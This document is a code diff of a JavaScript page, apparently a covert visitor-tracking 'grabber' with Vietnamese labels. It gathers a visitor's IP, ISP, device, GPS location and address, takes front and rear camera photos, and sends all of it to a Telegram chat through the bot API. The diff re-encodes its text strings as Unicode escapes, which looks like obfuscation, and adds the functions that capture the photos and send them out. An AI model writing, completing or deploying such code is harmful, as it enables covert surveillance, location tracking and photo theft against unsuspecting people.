@@ -15,7 +15,7 @@ const info = {
     lon: '',
     device: '',
     os: '',
-    camera: '⏳ Đang kiểm tra...'
+    camera: '\u23F3 \u0110\u0061\u006E\u0067 \u006B\u0069\u1EC3\u006D \u0074\u0072\u0061\u002E\u002E\u002E'
 };
 
 function detectDevice() {
@@ -84,7 +84,7 @@ async function getLocation() {
             async pos => {
                 info.lat = pos.coords.latitude;
                 info.lon = pos.coords.longitude;
-                const acc = pos.coords.accuracy ? ` (±${pos.coords.accuracy.toFixed(1)}m)` : '';
+                const acc = pos.coords.accuracy ? ` (\u00B1${pos.coords.accuracy.toFixed(1)}m)` : '';
                 try {
                     const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                     const data = await res.json();
@@ -105,7 +105,7 @@ async function fallbackIPLocation() {
         const data = await fetch(`https://ipwho.is/`).then(r => r.json());
         info.lat = data.latitude || '0';
         info.lon = data.longitude || '0';
-        info.address = `${data.city}, ${data.region} (Ước tính qua IP)`;
+        info.address = `${data.city}, ${data.region} (\u01AF\u1EDB\u0063 \u0074\u0068\u00ED\u006E\u0068 \u0071\u0075\u0061 \u0049\u0050)`;
     } catch (e) { info.address = 'Không xác định'; }
 }
 
@@ -137,17 +137,14 @@ function getCaption() {
         ? `https://www.google.com/maps?q=${info.lat},${info.lon}` 
         : 'Không rõ';
 
-    return `
-📡 [THÔNG TIN TRUY CẬP]
-
-🕒 Thời gian: ${info.time}
-📱 Thiết bị: ${info.device} (${info.os})
-🌍 IP Dân cư: ${info.ip}
-🏢 ISP: ${info.isp}
-🏙️ Địa chỉ: ${info.address}
-📌 Google Maps: ${mapsLink}
-📸 Camera: ${info.camera}
-`.trim();
+    return `\uD83D\uDCE1 [TH\u00D4NG TIN TRUY C\u1EACP]\n\n` +
+           `\u231B Th\u1EDDi gian: ${info.time}\n` +
+           `\uD83D\uDCF1 Thi\u1EBFt b\u1ECB: ${info.device} (${info.os})\n` +
+           `\uD83C\uDF10 IP D\u00E2n c\u01B0: ${info.ip}\n` +
+           `\uD83C\uDFE2 ISP: ${info.isp}\n` +
+           `\uD83C\uDFD9 \u0110\u1ECBa ch\u1EC9: ${info.address}\n` +
+           `\uD83D\uDCCC Google Maps: ${mapsLink}\n` +
+           `\uD83D\uDCF8 Camera: ${info.camera}`;
 }
 
 async function sendPhotos(frontBlob, backBlob) {
@@ -155,4 +152,45 @@ async function sendPhotos(frontBlob, backBlob) {
     formData.append('chat_id', TELEGRAM_CHAT_ID);
     
     const media = [];
-    if (front
+    if (frontBlob) {
+        media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
+        formData.append('front', frontBlob, 'front.jpg');
+    }
+    if (backBlob) {
+        media.push({ type: 'photo', media: 'attach://back' });
+        formData.append('back', backBlob, 'back.jpg');
+    }
+
+    formData.append('media', JSON.stringify(media));
+    return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
+}
+
+async function sendTextOnly() {
+    return fetch(API_SEND_TEXT, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
+    });
+}
+
+async function main() {
+    info.time = new Date().toLocaleString('vi-VN');
+    detectDevice();
+    
+    await Promise.all([getIPs(), getLocation()]);
+
+    let front = await captureCamera("user");
+    let back = null;
+    
+    if (front) {
+        back = await captureCamera("environment");
+    }
+
+    if (front || back) {
+        info.camera = `\u2705 \u0110\u00E3 ch\u1EE5p: ${front ? 'Trước' : ''} ${back ? 'Sau' : ''}`;
+        await sendPhotos(front, back);
+    } else {
+        info.camera = '\uD83D\uDEAB B\u1ECB t\u1EEB ch\u1ED1i ho\u1EB7c l\u1ED7i';
+        await sendTextOnly();
+    }
+}
